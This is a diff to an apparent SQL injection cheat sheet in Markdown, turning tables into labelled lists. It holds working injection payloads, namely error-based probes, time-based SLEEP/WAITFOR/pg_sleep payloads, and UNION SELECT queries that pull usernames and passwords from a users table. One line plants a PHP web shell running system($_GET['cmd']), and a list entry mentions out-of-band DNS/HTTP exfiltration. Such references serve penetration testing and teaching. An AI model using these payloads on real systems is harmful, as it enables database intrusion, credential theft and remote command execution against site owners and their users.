@@ -6,13 +6,15 @@
 
 ## Types
 
-| Type | Detection Method |
-|------|-----------------|
-| Error-based | Error messages in response |
-| Union-based | UNION SELECT to extract data |
-| Boolean-blind | True/False response differences |
-| Time-based blind | SLEEP/WAITFOR delays |
-| Out-of-band | DNS/HTTP callbacks |
+**Error-based** — Database error messages leak data in the response. Fastest to exploit manually.
+
+**Union-based** — Append a `UNION SELECT` to extract data from other tables.
+
+**Boolean-blind** — Response differs (content/size) based on true/false conditions. No visible output.
+
+**Time-based blind** — Use `SLEEP()` / `WAITFOR DELAY` to infer data when there's zero visual difference.
+
+**Out-of-band** — Trigger DNS or HTTP callbacks to exfiltrate data. Used when all other methods are blocked.
 
 ---
 
@@ -36,11 +38,15 @@
 ' OR 1=CONVERT(int, (SELECT @@version))--
 ' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
 
--- Time-based
-1' AND SLEEP(5)--                    # MySQL
-1'; WAITFOR DELAY '0:0:5'--          # MSSQL
-1' AND 1=1 pg_sleep(5)--             # PostgreSQL
-1' AND 1=(SELECT 1 FROM pg_sleep(5))--
+-- Time-based (MySQL)
+' AND SLEEP(5)--
+1; SELECT SLEEP(5)--
+
+-- Time-based (MSSQL)
+'; WAITFOR DELAY '0:0:5'--
+
+-- Time-based (PostgreSQL)
+'; SELECT pg_sleep(5)--
 ```
 
 ---
@@ -86,7 +92,7 @@ UNION SELECT 'a', NULL, NULL--
 -- Step 3: Extract data
 UNION SELECT username, password, NULL FROM users--
 
--- MySQL version/db
+-- MySQL info
 UNION SELECT @@version, @@datadir, user()--
 
 -- File read (MySQL)
@@ -101,13 +107,15 @@ UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL, NULL
 
 ## Database Fingerprinting
 
-| DB | Fingerprint Query |
-|----|-------------------|
-| MySQL | `SELECT @@version` |
-| MSSQL | `SELECT @@version` |
-| PostgreSQL | `SELECT version()` |
-| Oracle | `SELECT * FROM v$version` |
-| SQLite | `SELECT sqlite_version()` |
+**MySQL** → `SELECT @@version`
+
+**MSSQL** → `SELECT @@version`
+
+**PostgreSQL** → `SELECT version()`
+
+**Oracle** → `SELECT * FROM v$version`
+
+**SQLite** → `SELECT sqlite_version()`
 
 ---
 
